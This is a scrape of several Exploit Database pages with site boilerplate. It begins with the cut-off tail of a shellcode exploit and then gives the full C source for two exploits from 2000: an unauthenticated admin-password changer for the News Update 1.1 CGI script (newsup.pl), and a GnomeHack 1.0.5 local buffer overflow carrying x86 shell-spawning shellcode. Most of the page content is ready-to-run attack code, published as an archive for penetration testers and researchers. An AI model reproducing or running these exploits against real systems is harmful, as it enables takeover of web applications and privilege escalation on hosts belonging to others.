*)(&size))[2],((unsigned char *)(&size))[3]);strcat( gateway, " " );strcat( gateway, jmp );strcat( gateway, shellcode );strcat( gateway, program );hellcode += strlen(jmp) + strlen(shellcode);if ( zero( hellcode ) ) {fprintf( stderr, "Null byte(s) in `gateway' (0x%08x)!\n", hellcode );return( -1 );}*((unsigned int *)(gateway + strlen("0x42.0x42.0x42.0x42") + strlen(" ") + strlen(jmp) + 7)) = hellcode;hellcode += strlen(program) + 1;if ( zero( hellcode ) ) {fprintf( stderr, "Null byte(s) in `gateway' (0x%08x)!\n", hellcode );return( -1 );}*((unsigned int *)(gateway + strlen("0x42.0x42.0x42.0x42") + strlen(" ") + strlen(jmp) + 12)) = hellcode;execve( argv[0], argv, NULL );return( -1 );}// milw0rm.com [2000-11-15]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 179
News Update 1.1 - Change Admin Password - CGI webapps Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDNews Update 1.1 - Change Admin PasswordEDB-ID:179CVE:2000-0944EDB Verified:Author:morpheus[bd]Type:webappsExploit:/Platform:CGIDate:2000-11-15Vulnerable App:Become a Certified Penetration TesterEnroll inAdvanced Web Attacks and Exploitation, the courserequired to become anOffensive Security Web Expert (OSWE)GET CERTIFIED/***************************************************************************news_exp.c  -  description-------------------begin                : Sat Oct 21 2000copyright            : (C) 2000 by Morpheus[bd]email                : morpheusbd@gmx.netadvisory		 : www.brightdarkness.deExploit code for the News Update 1.1 by Morpheus[bd]For more information see my advisory which should be in this .tar.gzpackage.Compiling/Linking: gcc exploit.c -o exploitUsage: will be printed when the exploit is started without arguments***************************************************************************//***************************************************************************[Disclaimer]Standard disclaimer applies here. Do not use this program. This programis only for educational purposes. Use it on your on risk.***************************************************************************//****************************************************************************                                                                         **   This program is free software; you can redistribute it and/or modify  **   it under the terms of the GNU General Public License as published by  **   the Free Software Foundation; either version 2 of the License, or     **   (at your option) any later version.                                   **                                                                         ****************************************************************************/#include <stdio.h>#include <string.h>#include <ctype.h>#include <stdlib.h>#include <netdb.h>#include <sys/socket.h>#include <sys/types.h>#include <netinet/in.h>#include <arpa/inet.h>#include <errno.h>#include <fcntl.h>#include <signal.h>#include <arpa/nameser.h>#include <sys/stat.h>#define			WEISS		        printf("\033[0;29m")#define                 ROT                     printf("\033[1;31m")#define         	GRUEN                   printf("\033[1;32m")#define		        GELB                    printf("\033[1;33m")#define			BLAU		        printf("\033[1;34m")#define			LILA		        printf("\033[1;35m")#define         	HELLROT                 printf("\033[1;36m")#define MAXBUFFER       4096/******************* AUSGABEN ************************//* At the moment everything will be written to the STDOUT */#define EXPLOIT_INFO		2 /* If you only want Exploit infos ... change it to 1 and DEBUG to 1 */#define	DEBUG_INFO		2 /* If you only want Debug infos ... change DEBUG to 2 */#define	DEBUG			2/*****************************************************//* Standard-Pfad des News Update scripts */#define	NEWSUPDATE_PATH	"/cgi-bin/dummy/newsup"/* Name des News Update scripts */#define	NEWS_UPDATE	"newsup.pl"/* Das gew?schte Passwort f? die News Update Form */#define	PWD		"morpheus"/* HTTP-Request f? die News Update Form */#define	NEWS_UPDATE_PWD	"POST %s HTTP/1.0\r\n" \"Host: %s\r\n" \"Referrer: %s\r\n" \"Connection: Close\r\n" \"User-Agent: %s\r\n" \"Accept: */*\r\n" \"Content-type: application/x-www-urlencoded\r\n" \"Content-length: %d\r\n" \"\r\n" \"pwd=%s&pwd2=%s&setpwd=++Set+Password++\r\n" \"\r\n"/* Ein einfacher HTTP-Request um eine Datei von einem Web-Server zu saugen */#define SIMPLE_REQUEST	"GET %s HTTP/1.0\r\n" \"Host: %s\r\n" \"\r\n"#define BROWSER         "Morphi-Browser (X11; U; Linux 2.4 i686)"ssize_t writen(int fd, const void *vptr, size_t n)/* Taken from UNIX Network Programming - Vol. I by W.R. Stevens */{size_t nleft;ssize_t nwritten;const char *ptr;ptr = vptr;nleft = n;while(nleft > 0) {if ( (nwritten = write(fd, ptr, nleft)) <= 0) {if (errno == EINTR)nwritten = 0;elsereturn (-1);}nleft -= nwritten;ptr += nwritten;}return (n);}static ssize_t my_read(int fd, char *ptr)/* Taken from UNIX Network Programming - Vol. I by W.R. Stevens */{static int	read_cnt = 0;static char	*read_ptr;static char	read_buf[4096];if (read_cnt <= 0) {again:if ( (read_cnt = read(fd, read_buf, sizeof(read_buf))) < 0) {if (errno == EINTR)goto again;return(-1);} else if (read_cnt == 0)return(0);read_ptr = read_buf;}read_cnt--;*ptr = *read_ptr++;return(1);}ssize_t readline(int fd, void *vptr, size_t maxlen)/* Taken from UNIX Network Programming - Vol. I by W.R. Stevens */{int		n, rc;char	c, *ptr;ptr = vptr;for (n = 1; n < maxlen; n++) {if ( (rc = my_read(fd, &c)) == 1) {*ptr++ = c;if (c == '\n')break;	/* newline is stored, like fgets() */} else if (rc == 0) {if (n == 1)return(0);	/* EOF, no data read */elsebreak;		/* EOF, some data was read */} elsereturn(-1);		/* error, errno set by read() */}*ptr = 0;	/* null terminate like fgets() */return(n);}/* Stellt die Verbindung zum HTTP-Port des Servers her */int http_connection(char host[100]){struct sockaddr_in sa;struct hostent *hp;int sockfd;int port = 80;sockfd = socket(AF_INET, SOCK_STREAM, 0);bzero(&sa, sizeof(sa));sa.sin_family = AF_INET;sa.sin_port = htons(port);if ( (sa.sin_addr.s_addr = inet_addr(host)) == -1){if ( (hp = (struct hostent *) gethostbyname(host)) == NULL){ROT;perror("gethostbyname:");WEISS;return (-1);}memcpy(&sa.sin_addr.s_addr,hp->h_addr,sizeof(hp->h_addr));}if (connect(sockfd, (struct sockaddr *) &sa, sizeof(sa)) < 0){ROT;perror("Connect:");close(sockfd);WEISS;return (-1);}return sockfd;}/* Exploited das News Update script und schleu? ein neues Password ein */int news_update_exploit(char *host, char *path){int i = 0, sockfd = 0;char cmd[MAXBUFFER];if ((sockfd = http_connection(host)) == -1) { ROT; printf("Damn ... no connection to %s\n", host); WEISS; return; }i = snprintf(cmd, sizeof(cmd), NEWS_UPDATE_PWD, path, host, "www.brightdarkness.de", BROWSER, 34 + strlen(PWD), PWD, PWD);GELB;if (DEBUG == DEBUG_INFO) { GELB; printf("Sending following request to %s[%d]:\n%s", host, 80, cmd); WEISS; }WEISS;if (writen(sockfd, cmd, i) == -1){ROT;printf("Man, man, man ....... Ihr verdammten Idioten .... kann man hier nicht mal in Ruhe writen() ?\n");WEISS;exit(-1);}GELB;if (DEBUG == DEBUG_INFO) printf("Output from Server:\n");WEISS;while (readline(sockfd, cmd, MAXBUFFER) != 0){BLAU;if (DEBUG == DEBUG_INFO) printf("%s", cmd);WEISS;if (strstr(cmd, "Password Success") != NULL){GRUEN;if (DEBUG == EXPLOIT_INFO) printf("Exploit: Success!!!!\n");if (DEBUG == EXPLOIT_INFO) printf("The new password: %s\n", PWD);WEISS;return (0);}}ROT;if (DEBUG == EXPLOIT_INFO) printf("Exploit: failed.\n");WEISS;return (-1);}/* How to use this fucking lame proggy *rofl* */void usage(char *arg){ROT;printf("news_update_exploit - News Update Password Changer - v0.1\n");printf("------------=====||| by Morpheus[bd] |||=====------------\n");GELB;printf("\nUsage:");GRUEN;printf("%s host/ip [path]\n\n", arg);printf("path: alternative path to the newsup.pl\n");WEISS;exit(-1);}/* Existiert das Verzeichnis der Form ?erhaupt ? */int check_directory(char *host, char *ptr){int i = 0, sockfd = 0;char cmd[MAXBUFFER], *ptr2;ptr2 = ptr + strlen(ptr);if (*(ptr2 - 1) != '/'){*ptr2 = '/';*(ptr2 + 1) = '\0';}GELB;if (DEBUG == DEBUG_INFO) printf("Checking if %s exists on the target server...\n", ptr);WEISS;if ((sockfd = http_connection(host)) == -1) { ROT; printf("Damn !!!... No connection to %s.\n", host); WEISS; return; }i = snprintf(cmd, sizeof(cmd), SIMPLE_REQUEST, ptr, host);GELB;if (DEBUG == DEBUG_INFO) printf("Sending following request to %s[%d]:\n%s", host, 80, cmd);WEISS;if (writen(sockfd, cmd, i) == -1){ROT;printf("Man, man, man ....... Ihr verdammten Idioten .... kann man hier nicht mal in Ruhe writen() ?\n");WEISS;exit(-1);}if (readline(sockfd, cmd, MAXBUFFER) == 0){ROT;printf("Error: Reading from HTTP Server.\n");WEISS;exit(-1);}if (strstr(cmd, "404") == NULL){GRUEN;if (DEBUG == DEBUG_INFO) printf("The directory was found.\n");WEISS;while (readline(sockfd, cmd, MAXBUFFER) != 0);close(sockfd);return (0);}if (DEBUG == DEBUG_INFO) printf("The directory was NOT found.\n");while (readline(sockfd, cmd, MAXBUFFER) != 0);close(sockfd);return (-1);}/* Das tolle Hauptprogramm *fg* */int main(int argc, char **argv){char buf[MAXBUFFER];if (argc < 2){usage(argv[0]);}if (argc >= 3){/* Ein alternatives Verzeichnis wurde als Parameter ?ergeben */strncpy(buf, argv[2], sizeof(buf));if (check_directory(argv[1], buf) == -1){ROT;printf("Error: The given directory was not found.\nPlease provide a different directory.\n");WEISS;exit(-1);}strcat(buf, NEWS_UPDATE);}else{/* Kein alternatives Verz. angegeben, benutze Standard-Verzeichnis */strncpy(buf, NEWSUPDATE_PATH, sizeof(buf));if (check_directory(argv[1], buf) == -1){ROT;printf("Error: The given directory was not found.\nPlease provide a different directory.\n");WEISS;exit(-1);}strcat(buf, NEWS_UPDATE);}/* Let's rock !!!! */news_update_exploit(argv[1], buf);return (0);}// milw0rm.com [2000-11-15]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPort142122232542495366697079808110210511011111311912313513914316116216438338940240641144344444544650250451351451553254855455561762363165568978378780887388890199810001040108910991100111411201194123514711521153315811589160416171723174317611812185818611900194720002022204921002103212121252181224223152375238023812401248025252640281028122947295429903000303030503052312831293181320032173306333333783389346034653500353536323690379038143817400040024070408141054111432243434434450145554592466147504848500050605061508050815093515151805247525052725308543254665554555556005655566658005803581458585900598460666070608060826101611261296379650265036660666770017002707070717080710071447210727272907426744375107547764977707777777877877879790280008001800280048008802080228023802880308080808180828088809081818300840084438445847385008585861988008812883988808888900090019002908090909091910091249200925192569443944797849788985598769900998799939999100001000110080102021020310443106161100011211114601220312221123451239712401133271370113722138381699218821188811900019810198132000020010200312011120171220032342325672260002701527700280153000030303313373240032674327643420537215377773784838292400074152344334468244808049152500005049652311527895286952986534135434554890555545555556380577725808062514TagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 180
GnomeHack 1.0.5 - Local Buffer Overflow - Linux local Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDGnomeHack 1.0.5 - Local Buffer OverflowEDB-ID:180CVE:EDB Verified:Author:vade79Type:localExploit:/Platform:LinuxDate:2000-11-15Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/* (linux/debian)gnomehack[v1.0.5] buffer overflow, by: v9[v9@fakehalo.org].this will give you an egid=60(games) shell if gnomehack is sgid(=2755) gameson debian/2.2, which has gnomehack. (this can also be applied to nethack)syntax: ./deb_gnomehack [offset] [alignment].example:-------------------------------------------------# ./deb_gnomehack 500 0[ (linux/debian)gnomehack[v1.0.5] buffer overflow, by: v9[v9@fakehalo.org]. ][ return address: 0xbffff978, offset: 500, align: 0. ]sh-2.03$ iduid=1001(v9) gid=1001(v9) egid=60(games) groups=1001(v9)sh-2.03$-------------------------------------------------note: overflow exists in $NETHACKOPTIONS as well, like nethack.*/#define PATH "/usr/lib/games/gnomehack/gnomehack"       // path to gnomehack.#define DEFAULT_OFFSET 500                              // default offset.#define DEFAULT_ALIGN 0                                 // default alignment.static char exec[]="\xeb\x24\x5e\x8d\x1e\x89\x5e\x0b\x33\xd2\x89\x56\x07\x89\x56\x0f\xb8\x1b\x56""\x34\x12\x35\x10\x56\x34\x12\x8d\x4e\x0b\x8b\xd1\xcd\x80\x33\xc0\x40\xcd\x80""\xe8\xd7\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x01";long esp(void){__asm__("movl %esp,%eax");}int main(int argc,char **argv){char bof[300];int i,offset,align;long ret;printf("[ (linux/debian)gnomehack[v1.0.5] buffer overflow, by: v9[v9@fakehalo.""org]. ]\n");if(argc>1){offset=atoi(argv[1]);}else{offset=DEFAULT_OFFSET;}if(argc>2){if(atoi(argv[2])>3||atoi(argv[2])<0){printf("*** ignored argument alignment value: %s. (use 0-3)\n",argv[2]);align=DEFAULT_ALIGN;}else{align=atoi(argv[2]);}}else{align=DEFAULT_ALIGN;}ret=(esp()-offset);printf("[ return address: 0x%lx, offset: %d, align: %d. ]\n",ret,offset,align);for(i=align;i<300;i+=4){*(long *)&bof[i]=ret;}for(i=0;i<(250-strlen(exec));i++){*(bof+i)=0x90;}memcpy(bof+i,exec,strlen(exec));setenv("HOME",bof,1);if(execlp(PATH,"gnomehack",0)){printf("*** execution of %s failed. (check the path)\n",PATH);exit(-1);}}// milw0rm.com [2000-11-15]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The 